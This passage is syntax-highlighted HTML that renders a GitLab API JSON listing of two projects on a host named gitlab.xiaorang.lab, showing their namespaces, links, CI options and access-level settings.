class="line">        <span class="attr">&quot;namespace&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>!<span class="punctuation">[</span><span class="punctuation">]</span>(https<span class="punctuation">:</span><span class="comment">//tool.oschina.net/tools/json_format/Expanded.gif)</span></span><br><span class="line">            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">8</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;XRLAB&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;xrlab&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;kind&quot;</span><span class="punctuation">:</span> <span class="string">&quot;group&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;full_path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;xrlab&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;parent_id&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;avatar_url&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;web_url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/groups/xrlab&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;_links&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>!<span class="punctuation">[</span><span class="punctuation">]</span>(https<span class="punctuation">:</span><span class="comment">//tool.oschina.net/tools/json_format/Expanded.gif)</span></span><br><span class="line">            <span class="attr">&quot;self&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/api/v4/projects/2&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;issues&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/api/v4/projects/2/issues&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;merge_requests&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/api/v4/projects/2/merge_requests&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;repo_branches&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/api/v4/projects/2/repository/branches&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;labels&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/api/v4/projects/2/labels&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;events&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/api/v4/projects/2/events&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;members&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/api/v4/projects/2/members&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;cluster_agents&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/api/v4/projects/2/cluster_agents&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;packages_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;empty_repo&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;archived&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;visibility&quot;</span><span class="punctuation">:</span> <span class="string">&quot;private&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;resolve_outdated_diff_discussions&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;container_expiration_policy&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>!<span class="punctuation">[</span><span class="punctuation">]</span>(https<span class="punctuation">:</span><span class="comment">//tool.oschina.net/tools/json_format/Expanded.gif)</span></span><br><span class="line">            <span class="attr">&quot;cadence&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1d&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;keep_n&quot;</span><span class="punctuation">:</span> <span class="number">10</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;older_than&quot;</span><span class="punctuation">:</span> <span class="string">&quot;90d&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;name_regex&quot;</span><span class="punctuation">:</span> <span class="string">&quot;.*&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;name_regex_keep&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;next_run_at&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2022-12-26T07:44:18.627Z&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;issues_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;merge_requests_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;wiki_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;jobs_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;snippets_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;container_registry_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;service_desk_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;service_desk_address&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;can_create_merge_request_in&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;issues_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;repository_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;merge_requests_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;forking_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;wiki_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;disabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;builds_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;snippets_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;disabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;pages_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;public&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;operations_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;analytics_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;container_registry_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;disabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;security_and_compliance_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;private&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;releases_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;environments_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;feature_flags_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;infrastructure_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;monitor_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;emails_disabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;shared_runners_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;lfs_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;creator_id&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;import_url&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;import_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;gitlab_project&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;import_status&quot;</span><span class="punctuation">:</span> <span class="string">&quot;finished&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;open_issues_count&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;ci_default_git_depth&quot;</span><span class="punctuation">:</span> <span class="number">20</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;ci_forward_deployment_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;ci_job_token_scope_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;ci_separated_caches&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;ci_opt_in_jwt&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;ci_allow_fork_pipelines_to_run_in_parent_project&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;public_jobs&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;build_timeout&quot;</span><span class="punctuation">:</span> <span class="number">3600</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;auto_cancel_pending_pipelines&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;ci_config_path&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;shared_with_groups&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span> <span class="punctuation">]</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;only_allow_merge_if_pipeline_succeeds&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;allow_merge_on_skipped_pipeline&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;restrict_user_defined_variables&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;request_access_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;only_allow_merge_if_all_discussions_are_resolved&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;remove_source_branch_after_merge&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;printing_merge_request_link_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;merge_method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;merge&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;squash_option&quot;</span><span class="punctuation">:</span> <span class="string">&quot;default_off&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;enforce_auth_checks_on_uploads&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;suggestion_commit_message&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;merge_commit_template&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;squash_commit_template&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;issue_branch_template&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;auto_devops_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;auto_devops_deploy_strategy&quot;</span><span class="punctuation">:</span> <span class="string">&quot;continuous&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;autoclose_referenced_issues&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;keep_latest_artifact&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;runner_token_expiration_interval&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;permissions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>!<span class="punctuation">[</span><span class="punctuation">]</span>(https<span class="punctuation">:</span><span class="comment">//tool.oschina.net/tools/json_format/Expanded.gif)</span></span><br><span class="line">            <span class="attr">&quot;project_access&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>!<span class="punctuation">[</span><span class="punctuation">]</span>(https<span class="punctuation">:</span><span class="comment">//tool.oschina.net/tools/json_format/Expanded.gif)</span></span><br><span class="line">                <span class="attr">&quot;access_level&quot;</span><span class="punctuation">:</span> <span class="number">40</span><span class="punctuation">,</span> </span><br><span class="line">                <span class="attr">&quot;notification_level&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;group_access&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>!<span class="punctuation">[</span><span class="punctuation">]</span>(https<span class="punctuation">:</span><span class="comment">//tool.oschina.net/tools/json_format/Expanded.gif)</span></span><br><span class="line">                <span class="attr">&quot;access_level&quot;</span><span class="punctuation">:</span> <span class="number">50</span><span class="punctuation">,</span> </span><br><span class="line">                <span class="attr">&quot;notification_level&quot;</span><span class="punctuation">:</span> <span class="number">3</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span> </span><br><span class="line">    <span class="punctuation">&#123;</span>!<span class="punctuation">[</span><span class="punctuation">]</span>(https<span class="punctuation">:</span><span class="comment">//tool.oschina.net/tools/json_format/Expanded.gif)</span></span><br><span class="line">        <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;This project is automatically generated and helps monitor this GitLab instance. [Learn more](/help/administration/monitoring/gitlab_self_monitoring_project/index).&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Monitoring&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;name_with_namespace&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GitLab Instance / Monitoring&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Monitoring&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;path_with_namespace&quot;</span><span class="punctuation">:</span> <span class="string">&quot;gitlab-instance-23352f48/Monitoring&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;created_at&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2022-12-25T07:18:20.914Z&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;default_branch&quot;</span><span class="punctuation">:</span> <span class="string">&quot;main&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;tag_list&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span> <span class="punctuation">]</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;topics&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span> <span class="punctuation">]</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;ssh_url_to_repo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;git@gitlab.xiaorang.lab:gitlab-instance-23352f48/Monitoring.git&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;http_url_to_repo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/gitlab-instance-23352f48/Monitoring.git&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;web_url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/gitlab-instance-23352f48/Monitoring&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;readme_url&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;avatar_url&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;forks_count&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;star_count&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;last_activity_at&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2022-12-25T07:18:20.914Z&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;namespace&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>!<span class="punctuation">[</span><span class="punctuation">]</span>(https<span class="punctuation">:</span><span class="comment">//tool.oschina.net/tools/json_format/Expanded.gif)</span></span><br><span class="line">            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GitLab Instance&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;gitlab-instance-23352f48&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;kind&quot;</span><span class="punctuation">:</span> <span class="string">&quot;group&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;full_path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;gitlab-instance-23352f48&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;parent_id&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;avatar_url&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;web_url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/groups/gitlab-instance-23352f48&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;_links&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>!<span class="punctuation">[</span><span class="punctuation">]</span>(https<span class="punctuation">:</span><span class="comment">//tool.oschina.net/tools/json_format/Expanded.gif)</span></span><br><span class="line">            <span class="attr">&quot;self&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/api/v4/projects/1&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;issues&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/api/v4/projects/1/issues&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;merge_requests&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/api/v4/projects/1/merge_requests&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;repo_branches&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/api/v4/projects/1/repository/branches&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;labels&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/api/v4/projects/1/labels&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;events&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/api/v4/projects/1/events&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;members&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/api/v4/projects/1/members&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;cluster_agents&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/api/v4/projects/1/cluster_agents&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;packages_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;empty_repo&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;archived&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;visibility&quot;</span><span class="punctuation">:</span> <span class="string">&quot;internal&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;resolve_outdated_diff_discussions&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;container_expiration_policy&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>!<span class="punctuation">[</span><span class="punctuation">]</span>(https<span class="punctuation">:</span><span class="comment">//tool.oschina.net/tools/json_format/Expanded.gif)</span></span><br><span class="line">            <span class="attr">&quot;cadence&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1d&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;keep_n&quot;</span><span class="punctuation">:</span> <span class="number">10</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;older_than&quot;</span><span class="punctuation">:</span> <span class="string">&quot;90d&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;name_regex&quot;</span><span class="punctuation">:</span> <span class="string">&quot;.*&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;name_regex_keep&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;next_run_at&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2022-12-26T07:18:21.108Z&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;issues_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;merge_requests_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;wiki_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;jobs_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;snippets_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;container_registry_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;service_desk_enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;can_create_merge_request_in&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;issues_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;repository_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;merge_requests_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;forking_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;wiki_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;builds_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;snippets_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;pages_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;private&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;operations_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;analytics_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;container_registry_access_level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;enabled&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;security_and_compliance_access_level&quot;</span><span class="punctuation">:</span> <span 